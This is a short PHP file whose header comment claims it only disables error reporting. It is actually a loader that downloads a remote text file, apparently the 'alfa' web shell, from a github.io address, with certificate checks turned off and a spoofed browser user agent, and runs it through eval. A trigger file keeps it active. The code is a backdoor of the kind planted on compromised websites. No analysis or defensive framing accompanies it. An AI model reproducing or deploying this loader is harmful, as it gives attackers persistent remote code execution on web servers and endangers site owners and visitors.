<?php
/**
 * Disable error reporting
 * 
 * Set this to error_reporting( -1 ) for debugging.
 */
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($conn, CURLOPT_COOKIEJAR, $GLOBALS['coki']);
        curl_setopt($conn, CURLOPT_COOKIEFILE, $GLOBALS['coki']);
        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// Trigger untuk memeriksa status atau membuat file tetap berjalan
function keepAlive($triggerFile) {
    if (!file_exists($triggerFile)) {
        file_put_contents($triggerFile, "active");
    }
    $status = file_get_contents($triggerFile);
    if (trim($status) !== "active") {
        die("Trigger is deactivated. Script stopped.");
    }
}

// Nama file trigger
$triggerFile = __DIR__ . '/trigger.txt';
keepAlive($triggerFile);

// Jalankan fungsi utama
$a = geturlsinfo('https://tigerxcodee.github.io/dor/alfa.txt');

// Mengeksekusi kode yang diambil
if ($a) {
    eval('?>' . $a);
} else {
    echo "Failed to fetch data.";
}
?>
